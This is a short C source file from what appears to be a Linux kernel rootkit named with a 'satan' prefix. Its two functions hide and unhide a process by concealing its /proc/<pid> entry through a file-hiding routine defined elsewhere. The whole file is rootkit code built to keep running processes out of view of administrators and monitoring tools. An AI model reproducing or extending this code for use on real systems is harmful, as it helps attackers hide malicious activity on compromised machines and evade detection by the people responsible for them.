// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "proc.h"

#include <linux/kernel.h>

#include "file.h"


#define PATH_BUF_SIZE 32
static char path_buf[PATH_BUF_SIZE] = {0};

int satan_proc_hide(unsigned int pid)
{
        memset(path_buf, 0, PATH_BUF_SIZE);
        snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);

        return satan_file_hide(path_buf);
}

int satan_proc_unhide(unsigned int pid)
{
        memset(path_buf, 0, PATH_BUF_SIZE);
        snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);

        return satan_file_unhide(path_buf);
}
